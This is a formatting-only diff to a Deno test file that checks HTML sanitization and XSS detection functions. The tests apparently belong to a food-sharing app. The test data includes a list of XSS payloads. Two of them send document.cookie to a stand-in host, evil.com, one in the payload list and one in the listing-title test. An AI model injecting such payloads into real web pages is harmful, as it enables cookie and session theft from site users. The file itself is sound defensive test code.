@@ -4,16 +4,13 @@
  * Tests HTML sanitization functions and XSS attack vector prevention.
  */
 
-import {
-  assertEquals,
-  assertExists,
-} from "https://deno.land/std@0.208.0/assert/mod.ts";
+import { assertEquals } from "https://deno.land/std@0.208.0/assert/mod.ts";
 
 import {
-  sanitizeHtml,
-  stripDangerousContent,
   containsXssPatterns,
+  sanitizeHtml,
   sanitizeObject,
+  stripDangerousContent,
 } from "../../_shared/validation-rules.ts";
 
 // ============================================================================
@@ -24,7 +21,7 @@ const XSS_PAYLOADS = [
   // Script tags
   '<script>alert("XSS")</script>',
   '<script src="evil.js"></script>',
-  '<script>document.cookie</script>',
+  "<script>document.cookie</script>",
   "<SCRIPT>alert('XSS')</SCRIPT>",
   '<script>fetch("https://evil.com?c="+document.cookie)</script>',
 
@@ -39,7 +36,7 @@ const XSS_PAYLOADS = [
   // JavaScript URLs
   '<a href="javascript:alert(1)">click</a>',
   '<iframe src="javascript:alert(1)">',
-  'javascript:alert(document.domain)',
+  "javascript:alert(document.domain)",
   "JAvasCRipt:alert('XSS')",
 
   // Data URLs
@@ -53,17 +50,17 @@ const XSS_PAYLOADS = [
   '<div style="width: expression(alert(1))">',
 
   // Encoded payloads
-  '&#60;script&#62;alert(1)&#60;/script&#62;',
-  '%3Cscript%3Ealert(1)%3C/script%3E',
+  "&#60;script&#62;alert(1)&#60;/script&#62;",
+  "%3Cscript%3Ealert(1)%3C/script%3E",
 
   // Mixed case and whitespace
-  '<ScRiPt>alert(1)</ScRiPt>',
-  '<script >alert(1)</script >',
-  '<script\n>alert(1)</script>',
+  "<ScRiPt>alert(1)</ScRiPt>",
+  "<script >alert(1)</script >",
+  "<script\n>alert(1)</script>",
 
   // Nested/broken tags
-  '<<script>script>alert(1)<</script>/script>',
-  '<scr<script>ipt>alert(1)</script>',
+  "<<script>script>alert(1)<</script>/script>",
+  "<scr<script>ipt>alert(1)</script>",
 ];
 
 // ============================================================================
@@ -100,14 +97,14 @@ Deno.test("sanitizeHtml - escapes all XSS payloads", () => {
       assertEquals(
         !sanitized.includes("<"),
         true,
-        `Payload not sanitized: ${payload}`
+        `Payload not sanitized: ${payload}`,
       );
     }
     if (payload.includes(">")) {
       assertEquals(
         !sanitized.includes(">"),
         true,
-        `Payload not sanitized: ${payload}`
+        `Payload not sanitized: ${payload}`,
       );
     }
   }
@@ -128,12 +125,12 @@ Deno.test("sanitizeHtml - handles complex HTML injection", () => {
 
 Deno.test("stripDangerousContent - removes script tags", () => {
   assertEquals(
-    stripDangerousContent('<script>alert(1)</script>'),
-    ""
+    stripDangerousContent("<script>alert(1)</script>"),
+    "",
   );
   assertEquals(
-    stripDangerousContent('Hello<script>evil()</script>World'),
-    "HelloWorld"
+    stripDangerousContent("Hello<script>evil()</script>World"),
+    "HelloWorld",
   );
 });
 
@@ -143,7 +140,7 @@ Deno.test("stripDangerousContent - removes event handlers", () => {
 });
 
 Deno.test("stripDangerousContent - removes javascript: URLs", () => {
-  const result = stripDangerousContent('javascript:alert(1)');
+  const result = stripDangerousContent("javascript:alert(1)");
   assertEquals(result.includes("javascript:"), false);
 });
 
@@ -154,7 +151,7 @@ Deno.test("stripDangerousContent - removes all HTML tags", () => {
 
 Deno.test("stripDangerousContent - handles nested scripts", () => {
   const result = stripDangerousContent(
-    '<scr<script>ipt>alert(1)</scr</script>ipt>'
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
   );
   assertEquals(result.includes("<script"), false);
   assertEquals(result.includes("</script"), false);
@@ -165,18 +162,18 @@ Deno.test("stripDangerousContent - handles nested scripts", () => {
 // ============================================================================
 
 Deno.test("containsXssPatterns - detects script tags", () => {
-  assertEquals(containsXssPatterns('<script>alert(1)</script>'), true);
-  assertEquals(containsXssPatterns('<SCRIPT>alert(1)</SCRIPT>'), true);
+  assertEquals(containsXssPatterns("<script>alert(1)</script>"), true);
+  assertEquals(containsXssPatterns("<SCRIPT>alert(1)</SCRIPT>"), true);
 });
 
 Deno.test("containsXssPatterns - detects javascript: URLs", () => {
-  assertEquals(containsXssPatterns('javascript:alert(1)'), true);
-  assertEquals(containsXssPatterns('JAVASCRIPT:alert(1)'), true);
+  assertEquals(containsXssPatterns("javascript:alert(1)"), true);
+  assertEquals(containsXssPatterns("JAVASCRIPT:alert(1)"), true);
 });
 
 Deno.test("containsXssPatterns - detects event handlers", () => {
   assertEquals(containsXssPatterns('onclick="alert(1)"'), true);
-  assertEquals(containsXssPatterns('onerror =alert(1)'), true);
+  assertEquals(containsXssPatterns("onerror =alert(1)"), true);
   assertEquals(containsXssPatterns('onload= "alert(1)"'), true);
 });
 
@@ -252,7 +249,7 @@ Deno.test("sanitizeObject - respects excludeKeys option", () => {
 
 Deno.test("sanitizeObject - stripDangerous mode removes content", () => {
   const input = {
-    content: '<script>alert(1)</script>Hello',
+    content: "<script>alert(1)</script>Hello",
   };
 
   const result = sanitizeObject(input, { stripDangerous: true });
@@ -265,7 +262,8 @@ Deno.test("sanitizeObject - stripDangerous mode removes content", () => {
 // ============================================================================
 
 Deno.test("XSS in listing title is sanitized", () => {
-  const listingTitle = '<script>document.location="https://evil.com?c="+document.cookie</script>Free Food';
+  const listingTitle =
+    '<script>document.location="https://evil.com?c="+document.cookie</script>Free Food';
   const sanitized = sanitizeHtml(listingTitle);
 
   assertEquals(sanitized.includes("<script>"), false);
@@ -274,7 +272,7 @@ Deno.test("XSS in listing title is sanitized", () => {
 });
 
 Deno.test("XSS in profile bio is sanitized", () => {
-  const bio = 'I love cooking! <img src=x onerror=alert(1)> Check out my recipes.';
+  const bio = "I love cooking! <img src=x onerror=alert(1)> Check out my recipes.";
   const sanitized = sanitizeHtml(bio);
 
   assertEquals(sanitized.includes("<img"), false);
